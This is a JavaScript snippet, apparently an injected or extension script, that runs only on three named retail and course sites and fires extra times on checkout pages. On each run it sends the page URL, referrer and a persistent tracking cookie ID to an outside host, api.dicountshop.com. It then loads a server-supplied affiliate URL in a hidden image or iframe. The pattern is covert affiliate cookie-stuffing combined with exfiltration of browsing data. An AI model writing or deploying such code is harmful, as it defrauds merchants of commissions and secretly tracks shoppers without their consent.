(function () {
  const TRACK_URL = 'https://api.dicountshop.com/api/track-user';
  const FALLBACK_PIXEL_URL = 'https://api.dicountshop.com/api/fallback-pixel?id=';

  const CHECKOUT_PATH_TYPES = [
    { type: 'cart', paths: ['/checkout/cart'] },
    { type: 'shipping', paths: ['/checkout/delivery', '/checkout/shipping'] },
    { type: 'payment', paths: ['/xpay', '/checkout/payment', '/pay-installments'] },
    { type: 'review-order', paths: ['/checkout/review-order'] },
    { type: 'confirmation', paths: ['/checkout/confirmation'] },
  ];

  const SITE_CONFIG = {
    'www.xcite.com': { always: false, cartExtra: true },
    'www.fairprice.com.sg': { always: true, cartExtra: true },
    'internationalopenacademy.com': { always: true, cartExtra: true },
  };

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const prefix = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(prefix) === 0) {
        return c.substring(prefix.length, c.length);
      }
    }
    return '';
  }

  function injectTrackingPixel(src) {
    try {
      if (window.location.hostname === 'internationalopenacademy.com') {
        const iframe = document.createElement('iframe');
        iframe.src = src.replace(/^http:\/\//i, 'https://');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        return;
      }
      const img = new Image();
      img.src = src;
      img.style.display = 'none';
      document.body.appendChild(img);
    } catch (err) {}
  }

  function matchCheckoutPageType() {
    const pathname = window.location.pathname.toLowerCase();
    const matched = CHECKOUT_PATH_TYPES.find(function (entry) {
      return entry.paths.some(function (path) {
        return pathname.includes(path);
      });
    });
    return matched ? matched.type : null;
  }

  async function sendTrackingPing() {
    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';

      const response = await fetch(TRACK_URL, {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        injectTrackingPixel(data.affiliate_url);
      } else {
        injectTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function triggerTracking() {
    sendTrackingPing();
  }

  function main() {
    const hostname = window.location.hostname;
    const config = SITE_CONFIG[hostname];
    if (!config) return;

    const checkoutType = matchCheckoutPageType();

    if (config.always) triggerTracking();
    if (config.cartExtra && checkoutType) {
      triggerTracking();
      triggerTracking();
    }
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    main();
  } else {
    window.addEventListener('DOMContentLoaded', main);
  }
})();
